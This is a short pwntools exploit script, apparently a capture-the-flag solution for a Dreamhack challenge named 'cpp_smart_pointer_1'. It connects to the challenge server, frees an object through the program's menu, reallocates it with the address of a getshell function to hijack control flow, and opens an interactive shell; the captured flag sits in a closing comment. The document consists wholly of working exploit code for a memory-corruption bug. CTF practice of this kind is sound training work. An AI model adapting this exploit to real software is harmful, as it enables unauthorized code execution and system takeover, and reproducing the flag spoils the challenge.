from pwn import *

context.terminal = ['kitty']
getshell = 0x40161d 


# r = process('./cpp_smart_pointer_1')
r = remote('host3.dreamhack.games', 17171)

r.sendlineafter(": ", "2") # delete
r.sendlineafter(": ", "1")

r.sendlineafter(": ", "4") # malloc
r.sendlineafter(": ", "AAAA") # malloc
r.sendlineafter(": ", "4") # malloc
r.sendlineafter(": ", p64(getshell)) # malloc

r.sendlineafter(": ", "3")
r.sendlineafter(": ", "2")

r.interactive()

# DH{d41fb699ad2e0d6fc43c1a6f66d08e35}

